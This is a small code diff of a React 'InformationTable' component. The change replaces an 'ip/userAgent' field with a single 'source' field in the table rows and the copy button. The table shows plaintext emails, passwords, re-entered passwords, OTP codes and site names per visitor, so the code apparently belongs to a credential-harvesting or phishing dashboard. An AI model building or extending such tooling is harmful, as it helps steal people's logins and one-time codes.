@@ -76,7 +76,7 @@ const InformationTable = () => {
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user, updatedAt,agent:{ip,userAgent}, email, password, repassword, otp, siteName, _id }, index) => (
+              displayInfo?.map(({ user, updatedAt,agent:{ip,source}, email, password, repassword, otp, siteName, _id }, index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -118,7 +118,7 @@ const InformationTable = () => {
                   <td className="px-2 py-1 font-bold cursor-pointer ">
                     <div className="relative inline-block">
                       <button
-                        onClick={() => handleCopyClick(`${(ip && userAgent) && (ip +'/'+userAgent)}`)}
+                        onClick={() => handleCopyClick(`${source}`)}
                         className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
                           }`}>Copy</button>
                     </div>
